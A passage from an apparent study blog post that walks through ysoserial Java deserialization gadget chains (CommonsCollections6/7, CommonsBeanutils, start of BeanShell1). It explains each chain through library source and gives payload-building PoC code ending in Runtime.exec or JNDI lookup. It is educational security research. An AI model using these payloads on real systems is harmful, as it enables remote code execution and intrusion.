<span class="variable">val</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);  </span><br><span class="line"><span class="type">Field</span> <span class="variable">valfield</span> <span class="operator">=</span> val.getClass().getDeclaredField(<span class="string">&quot;val&quot;</span>);  </span><br><span class="line">      Reflections.setAccessible(valfield);  </span><br><span class="line">valfield.set(val, entry);</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>End.</p><h3 id="CommonCollections6-jdk1-8-1-7"><a href="#CommonCollections6-jdk1-8-1-7" class="headerlink" title="CommonCollections6 jdk1.8 1.7"></a>CommonCollections6 jdk1.8 1.7</h3><blockquote><p>[!NOTE] pre-requirements<br>JDK1.7 or 1.8, reproduce successful on both<br>commons-collections:commons-collections:3.1</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Gadget chain:</span></span><br><span class="line">java.io.ObjectInputStream.readObject()</span><br><span class="line">java.util.HashSet.readObject()</span><br><span class="line">java.util.HashMap.put()</span><br><span class="line">java.util.HashMap.hash()</span><br><span class="line">org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()</span><br><span class="line">org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()</span><br><span class="line">org.apache.commons.collections.map.LazyMap.get()</span><br><span class="line">org.apache.commons.collections.functors.ChainedTransformer.transform()</span><br><span class="line">org.apache.commons.collections.functors.InvokerTransformer.transform()</span><br><span class="line">java.lang.reflect.Method.invoke()</span><br><span class="line">java.lang.Runtime.exec()</span><br></pre></td></tr></table></figure><p>In general, <code>TiedMapEntry</code>‘s <code>hashCode()</code> method would call <code>map.get(key)</code> and make a flaw for <code>LazyMap</code>. <code>HashMap</code>‘s <code>readObject()</code> calls <code>hashCode()</code> of key to calculate hash, which makes sense for the exploitation above.</p><p>Firstly, see <code>HashMap</code>‘s <code>readObject()</code>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream s)</span>  </span><br><span class="line">    <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;  </span><br><span class="line">  ...</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; mappings; i++) &#123;  </span><br><span class="line">    <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span>  </span><br><span class="line">        <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> (K) s.readObject();  </span><br><span class="line">    <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span>  </span><br><span class="line">        <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> (V) s.readObject();  </span><br><span class="line">    putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">false</span>);  </span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">    </span><br></pre></td></tr></table></figure><p>Step into <code>hash()</code>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">hash</span><span class="params">(Object key)</span> &#123;  </span><br><span class="line">    <span class="type">int</span> h;  </span><br><span class="line">    <span class="keyword">return</span> (key == <span class="literal">null</span>) ? <span class="number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="number">16</span>);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>If key is a <code>TiedMapEntry</code>, then the common exploitation chain takes effect.</p><p>So the next step is to put a <code>TiedMapEntry</code> into hash map.<br>To avoid contaminating <code>LazyMap</code> during payload creation, <strong>we should not just call  <code>map.put</code> to insert node</strong>. In order to avoid calling <code>hash(entry)</code>, there are two alternative ways: by <code>putVal()</code> or directly inserting node into underlying hash table(later is what ysoserial does). Let’s reproduce the former way(<code>putVal</code>). </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();  </span><br><span class="line"><span class="keyword">final</span> <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, transformerChain);  </span><br><span class="line"><span class="type">TiedMapEntry</span> <span class="variable">entry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;padishah&quot;</span>);  </span><br><span class="line">  </span><br><span class="line"><span class="type">HashMap</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();  </span><br><span class="line"><span class="type">Method</span> <span class="variable">putMethod</span> <span class="operator">=</span> <span class="literal">null</span>;  </span><br><span class="line"><span class="type">int</span> <span class="variable">JDK_VERSION</span> <span class="operator">=</span> -<span class="number">1</span>;  </span><br><span class="line"><span class="keyword">try</span> &#123;  </span><br><span class="line">    putMethod = HashMap.class.getDeclaredMethod(<span class="string">&quot;putVal&quot;</span>, <span class="type">int</span>.class, Object.class, Object.class, <span class="type">boolean</span>.class, <span class="type">boolean</span>.class);  </span><br><span class="line">    JDK_VERSION = <span class="number">8</span>;  </span><br><span class="line">&#125; <span class="keyword">catch</span> (NoSuchMethodException e) &#123;  </span><br><span class="line">    putMethod = HashMap.class.getDeclaredMethod(<span class="string">&quot;addEntry&quot;</span>, <span class="type">int</span>.class, Object.class, Object.class, <span class="type">int</span>.class);  </span><br><span class="line">    JDK_VERSION = <span class="number">7</span>;  </span><br><span class="line">&#125;  </span><br><span class="line">putMethod.setAccessible(<span class="literal">true</span>);  </span><br><span class="line"><span class="type">int</span> <span class="variable">hash</span> <span class="operator">=</span> transformerChain.hashCode();<span class="comment">// a random hashcode  </span></span><br><span class="line"><span class="keyword">if</span> (JDK_VERSION == <span class="number">8</span>) &#123;  </span><br><span class="line">    putMethod.invoke(map, hash, entry, <span class="string">&quot;value&quot;</span>, <span class="literal">false</span>, <span class="literal">true</span>);  </span><br><span class="line">&#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">    putMethod.invoke(map, hash, entry, <span class="string">&quot;value&quot;</span>, <span class="number">0</span>);  </span><br><span class="line">&#125;  </span><br><span class="line">Reflections.setFieldValue(transformerChain, <span class="string">&quot;iTransformers&quot;</span>, transformers);  </span><br><span class="line"><span class="keyword">return</span> map;</span><br></pre></td></tr></table></figure><p>^CC6-1<br>Note that, <code>HashMap</code> for JDK1.7 adds node in a different way from that of JDK1.8. JDK1.7 use <code>addEntry</code> in replacement of <code>putVal</code>.</p><h3 id="CommonCollections7-jdk1-8-1-7"><a href="#CommonCollections7-jdk1-8-1-7" class="headerlink" title="CommonCollections7 jdk1.8 1.7"></a>CommonCollections7 jdk1.8 1.7</h3><blockquote><p>[!NOTE] pre-requirements<br>JDK1.7 or 1.8, only reproduced on JDK1.8<br>commons-collections:commons-collections:3.1</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Gadget chain:</span></span><br><span class="line">java.util.Hashtable.readObject  </span><br><span class="line">java.util.Hashtable.reconstitutionPut  </span><br><span class="line">org.apache.commons.collections.map.AbstractMapDecorator.equals  </span><br><span class="line">java.util.AbstractMap.equals  </span><br><span class="line">org.apache.commons.collections.map.LazyMap.get  </span><br><span class="line">org.apache.commons.collections.functors.ChainedTransformer.transform  </span><br><span class="line">org.apache.commons.collections.functors.InvokerTransformer.transform  </span><br><span class="line">java.lang.reflect.Method.invoke  </span><br><span class="line">sun.reflect.DelegatingMethodAccessorImpl.invoke  </span><br><span class="line">sun.reflect.NativeMethodAccessorImpl.invoke  </span><br><span class="line">sun.reflect.NativeMethodAccessorImpl.invoke0  </span><br><span class="line">java.lang.Runtime.exec</span><br></pre></td></tr></table></figure><h4 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h4><p>This vulnerability exists in <code>Hashtable</code>‘s hash collision check progress which is part of <code>readObject()</code>. It will compare hash between the node to be inserted and each existing node. If their hash appears to be the same, then compare further using <code>equals()</code>. Both <code>hashCode()</code> and <code>equals()</code> are delegated to the node itself.<br><code>AbstractMap</code>(which is the super class of <code>HashMap</code>)’s <code>equals()</code> will call <code>that.get()</code>, that satisfies <code>LazyMap</code>‘s trigger condition.<br>It’s quite easy to spoof two <code>LazyMap</code> nodes that have the same hash but different keys. This is how this vul occurs.</p><h4 id="Exploit-chain"><a href="#Exploit-chain" class="headerlink" title="Exploit chain"></a>Exploit chain</h4><p>Firstly, see <code>Hashtable</code>‘s <code>readObject()</code>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream s)</span>  </span><br><span class="line">     <span class="keyword">throws</span> IOException, ClassNotFoundException  </span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (; elements &gt; <span class="number">0</span>; elements--) &#123;  </span><br><span class="line">    <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span>  </span><br><span class="line">        <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> (K)s.readObject();  </span><br><span class="line">    <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span>  </span><br><span class="line">        <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> (V)s.readObject();  </span><br><span class="line">    <span class="comment">// sync is eliminated for performance  </span></span><br><span class="line">    reconstitutionPut(table, key, value);  </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Step into <code>reconstitutionPut()</code>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">reconstitutionPut</span><span class="params">(Entry&lt;?,?&gt;[] tab, K key, V value)</span>  </span><br><span class="line">    <span class="keyword">throws</span> StreamCorruptedException  </span><br><span class="line">&#123;</span><br><span class="line">...</span><br><span class="line"><span class="type">int</span> <span class="variable">hash</span> <span class="operator">=</span> key.hashCode();  </span><br><span class="line"><span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> (hash &amp; <span class="number">0x7FFFFFFF</span>) % tab.length;  </span><br><span class="line"><span class="keyword">for</span> (Entry&lt;?,?&gt; e = tab[index] ; e != <span class="literal">null</span> ; e = e.next) &#123;  </span><br><span class="line">    <span class="keyword">if</span> ((e.hash == hash) &amp;&amp; e.key.equals(key)) &#123;  </span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.StreamCorruptedException();  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>We should satisfy <code>e.hash==hash</code> to reach <code>equals(key)</code>. When using <code>LazyMap</code> to decorate <code>HashMap</code>, <code>equals()</code> will delegate to <code>AbstractMap</code>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object o)</span> &#123;</span><br><span class="line">...</span><br><span class="line">Map&lt;?,?&gt; m = (Map&lt;?,?&gt;) o;</span><br><span class="line">...</span><br><span class="line">Iterator&lt;Entry&lt;K,V&gt;&gt; i = entrySet().iterator();  </span><br><span class="line"><span class="keyword">while</span> (i.hasNext()) &#123;  </span><br><span class="line">    Entry&lt;K,V&gt; e = i.next();  </span><br><span class="line">    <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> e.getKey();  </span><br><span class="line">    <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> e.getValue();  </span><br><span class="line">    <span class="keyword">if</span> (value == <span class="literal">null</span>) &#123;  </span><br><span class="line">        <span class="keyword">if</span> (!(m.get(key)==<span class="literal">null</span> &amp;&amp; m.containsKey(key)))  </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;  </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">        <span class="keyword">if</span> (!value.equals(m.get(key)))  </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>^CC7-01</p><p>If the input object <code>o</code> is a <code>LazyMap</code>, <code>m.get(key)</code> will trigger its transformers. By the way, even if a <code>LazyMap</code> does not have the key of another map, it’s still equivalent to that map(which can be any map), since it’s able to create the missing key and <code>get()</code> will always return a value. ^1b8389</p><h4 id="Hash-collision"><a href="#Hash-collision" class="headerlink" title="Hash collision"></a>Hash collision</h4><p>After understanding the routine, let’s construct the two <code>LazyMap</code>. First, look at the <code>hashCode()</code> of <code>LazyMap</code>, which delegates to <code>AbstractMapDecorator</code>, then delegates to the underlying map(here is <code>HashMap</code>), finally find it in its super class <code>AbstractMap</code>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;  </span><br><span class="line">    <span class="type">int</span> <span class="variable">h</span> <span class="operator">=</span> <span class="number">0</span>;  </span><br><span class="line">    Iterator&lt;Entry&lt;K,V&gt;&gt; i = entrySet().iterator();  </span><br><span class="line">    <span class="keyword">while</span> (i.hasNext())  </span><br><span class="line">        h += i.next().hashCode();  </span><br><span class="line">    <span class="keyword">return</span> h;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Consider a <code>LazyMap</code> with single entry: <code>&quot;aa&quot;: 1</code>, its hash code should equals to <code>&quot;aa&quot;.hashCode()</code>. Step into <code>String#hashCode</code>, its document says:</p><blockquote><p>Returns a hash code for this string. The hash code for a String object is computed as:<br>s[0]*31^(n-1) + s[1]*31^(n-2) + … + s[n-1]</p><p>using int arithmetic, where s[i] is the ith character of the string, n is the length of the string, and ^ indicates exponentiation. (The hash value of the empty string is zero.)</p></blockquote><p><code>&quot;ab&quot;.hashCode()</code> is calculated as <code>&#39;a&#39;*31 + &#39;b&#39;</code>. It’s easy to find a collision. Abstract the hash code of two-character string to <code>x*31 + y</code>, which is equals to <code>(x+1)*31 + (y-31)</code>, so one of the equivalences of <code>&quot;ab&quot;</code> is <code>&quot;bC&quot;</code> .</p><h4 id="Write-payload"><a href="#Write-payload" class="headerlink" title="Write payload"></a>Write payload</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;&#125;);</span><br><span class="line"><span class="type">Map</span> <span class="variable">innerMap1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();  </span><br><span class="line"><span class="type">Map</span> <span class="variable">innerMap2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();  </span><br><span class="line"><span class="type">LazyMap</span> <span class="variable">lazyMap1</span> <span class="operator">=</span> (LazyMap) LazyMap.decorate(innerMap1, chainedTransformer1);  </span><br><span class="line"><span class="type">LazyMap</span> <span class="variable">lazyMap2</span> <span class="operator">=</span> (LazyMap) LazyMap.decorate(innerMap2, chainedTransformer1);  </span><br><span class="line">lazyMap1.put(<span class="string">&quot;ab&quot;</span>, <span class="number">1</span>);  </span><br><span class="line">lazyMap2.put(<span class="string">&quot;bC&quot;</span>, <span class="number">1</span>);  </span><br><span class="line">  </span><br><span class="line"><span class="type">Hashtable</span> <span class="variable">hashtable</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();  </span><br><span class="line">hashtable.put(lazyMap1, <span class="number">1</span>);  </span><br><span class="line">hashtable.put(lazyMap2, <span class="number">1</span>);  </span><br><span class="line">  </span><br><span class="line">Reflections.setFieldValue(chainedTransformer1, <span class="string">&quot;iTransformers&quot;</span>, transformers);  </span><br><span class="line">  </span><br><span class="line">lazyMap2.remove(<span class="string">&quot;ab&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> hashtable;</span><br></pre></td></tr></table></figure><p>Note that, while put <code>lazyMap2</code> into hash table, we can see in [[Java Deserialize Vulnerabilities ysoserial study#^CC7-01|this code block]] that <code>lazyMap2.get(&quot;ab&quot;)</code> would be called in <code>equals()</code>, so we should remove this redundant entry. To ensure <code>lazyMap2.get(&quot;ab&quot;)</code> is not equal to that of <code>lazyMap1</code>, we decorate <code>lazyMap2</code> with a transformer that will not return <code>1</code>(an empty chain, will get <code>ab: ab</code>).</p><p>End.</p><hr><h2 id="CommonsBeanutils"><a href="#CommonsBeanutils" class="headerlink" title="CommonsBeanutils"></a>CommonsBeanutils</h2><blockquote><p>[!NOTE] pre-requirements<br>JDK1.8<br>commons-beanutils:commons-beanutils:1.9.2<br>commons-collections:commons-collections:3.1<br>commons-logging:commons-logging:1.2</p></blockquote><h3 id="Using-TemplatesImpl-CB1-CB2"><a href="#Using-TemplatesImpl-CB1-CB2" class="headerlink" title="Using TemplatesImpl (CB1 CB2)"></a>Using TemplatesImpl (CB1 CB2)</h3><p><code>TemplatesImpl</code> has an property named <code>_outputProperties</code> whose getter is <code>getOutputProperties()</code> according to java bean naming principle. </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> Properties <span class="title function_">getOutputProperties</span><span class="params">()</span> &#123;   </span><br><span class="line"><span class="keyword">try</span> &#123;  </span><br><span class="line">    <span class="keyword">return</span> newTransformer().getOutputProperties();  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="keyword">catch</span> (TransformerConfigurationException e) &#123;  </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;  </span><br><span class="line">&#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>In this method, the method <code>newTransformer()</code> is called, which serves as an entry to executing arbitrary code([[Java Deserialize Vulnerabilities ysoserial study#TemplatesImpl exploit|here]]).<br>The class <code>BeanComparator</code> in <code>commons-beanutils</code> project is disclosed for triggering this flaw in the deserialization procession.<br>In its <code>compare()</code> method:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compare</span><span class="params">( T o1, T o2 )</span> &#123;  </span><br><span class="line">   ...</span><br><span class="line"><span class="type">Object</span> <span class="variable">value1</span> <span class="operator">=</span> PropertyUtils.getProperty( o1, property );  </span><br><span class="line"><span class="type">Object</span> <span class="variable">value2</span> <span class="operator">=</span> PropertyUtils.getProperty( o2, property );</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>In <code>getSimpleProperty()</code> method:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">getSimpleProperty</span><span class="params">(Object bean, String name)</span>&#123;</span><br><span class="line">...</span><br><span class="line"><span class="type">PropertyDescriptor</span> <span class="variable">descriptor</span> <span class="operator">=</span>  </span><br><span class="line">        getPropertyDescriptor(bean, name);  </span><br><span class="line"><span class="keyword">if</span> (descriptor == <span class="literal">null</span>) &#123;  </span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NoSuchMethodException</span>(<span class="string">&quot;Unknown property &#x27;&quot;</span> +  </span><br><span class="line">            name + <span class="string">&quot;&#x27; on class &#x27;&quot;</span> + bean.getClass() + <span class="string">&quot;&#x27;&quot;</span> );  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="type">Method</span> <span class="variable">readMethod</span> <span class="operator">=</span> getReadMethod(bean.getClass(), descriptor);  </span><br><span class="line"><span class="keyword">if</span> (readMethod == <span class="literal">null</span>) &#123;  </span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NoSuchMethodException</span>(<span class="string">&quot;Property &#x27;&quot;</span> + name +  </span><br><span class="line">            <span class="string">&quot;&#x27; has no getter method in class &#x27;&quot;</span> + bean.getClass() + <span class="string">&quot;&#x27;&quot;</span>);  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="comment">// Call the property getter and return the value  </span></span><br><span class="line"><span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> invokeMethod(readMethod, bean, EMPTY_OBJECT_ARRAY);</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>In this method, firstly it creates a <code>PropertyDescriptor</code> of the input bean and gets the getter according to the property name. When the getter is invoked, our <code>TemplatesImpl</code> is ignited.</p><p>Poc:<br>Note that, set the <code>property</code> member of <code>BeanComparator</code> to  <code>lowestSetBit</code> so as to successfully add initial value to queue. You can also set it to null.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="type">Object</span> <span class="variable">templates</span> <span class="operator">=</span> Gadgets.createTemplatesImpl(command);  </span><br><span class="line"><span class="comment">// mock method name until armed  </span></span><br><span class="line"><span class="keyword">final</span> <span class="type">BeanComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>(<span class="string">&quot;lowestSetBit&quot;</span>);<span class="comment">// or null</span></span><br><span class="line">  </span><br><span class="line"><span class="comment">// create queue with numbers and basic comparator  </span></span><br><span class="line"><span class="keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;Object&gt;(<span class="number">2</span>, comparator);  </span><br><span class="line"><span class="comment">// stub data for replacement later  </span></span><br><span class="line">queue.add(<span class="keyword">new</span> <span class="title class_">BigInteger</span>(<span class="string">&quot;1&quot;</span>));  </span><br><span class="line">queue.add(<span class="keyword">new</span> <span class="title class_">BigInteger</span>(<span class="string">&quot;1&quot;</span>));  </span><br><span class="line">  </span><br><span class="line">Reflections.setFieldValue(comparator, <span class="string">&quot;property&quot;</span>, <span class="string">&quot;outputProperties&quot;</span>);  </span><br><span class="line">Reflections.setFieldValue(queue, <span class="string">&quot;queue&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates, templates&#125;);  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">return</span> queue;</span><br></pre></td></tr></table></figure><h3 id="Using-JdbcRowSetImpl-CB3"><a href="#Using-JdbcRowSetImpl-CB3" class="headerlink" title="Using JdbcRowSetImpl (CB3)"></a>Using JdbcRowSetImpl (CB3)</h3><p>The <code>JdbcRowSetImpl</code> class has a property named <code>databaseMetaData</code> whose getter calls <code>connect()</code> to look up a JNDI URL.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> DatabaseMetaData <span class="title function_">getDatabaseMetaData</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;  </span><br><span class="line">    <span class="type">Connection</span> <span class="variable">con</span> <span class="operator">=</span> connect();  </span><br><span class="line">    <span class="keyword">return</span> con.getMetaData();  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Poc:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">BeanComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>(<span class="string">&quot;lowestSetBit&quot;</span>);  </span><br><span class="line"><span class="type">JdbcRowSetImpl</span> <span class="variable">rs</span>         <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JdbcRowSetImpl</span>();  </span><br><span class="line">rs.setDataSourceName(jndiURL);  </span><br><span class="line">rs.setMatchColumn(<span class="string">&quot;xx&quot;</span>);  </span><br><span class="line"><span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>, comparator);  </span><br><span class="line">  </span><br><span class="line">queue.add(<span class="keyword">new</span> <span class="title class_">BigInteger</span>(<span class="string">&quot;1&quot;</span>));  </span><br><span class="line">queue.add(<span class="keyword">new</span> <span class="title class_">BigInteger</span>(<span class="string">&quot;1&quot;</span>));  </span><br><span class="line">  </span><br><span class="line">Reflections.setFieldValue(comparator, <span class="string">&quot;property&quot;</span>, <span class="string">&quot;databaseMetaData&quot;</span>);  </span><br><span class="line">Reflections.setFieldValue(queue, <span class="string">&quot;queue&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;rs, rs&#125;);  </span><br><span class="line"><span class="keyword">return</span> queue;</span><br></pre></td></tr></table></figure><hr><h2 id="BeanShell"><a href="#BeanShell" class="headerlink" title="BeanShell"></a>BeanShell</h2><h3 id="BeanShell1-CVE-2016-2510"><a href="#BeanShell1-CVE-2016-2510" class="headerlink" title="BeanShell1  CVE-2016-2510"></a>BeanShell1  <a href="https://github.com/advisories/GHSA-gxg6-rc6c-v673" title="CVE-2016-2510">CVE-2016-2510</a></h3><blockquote><p>[!NOTE] pre-requirements<br>Reproduced on 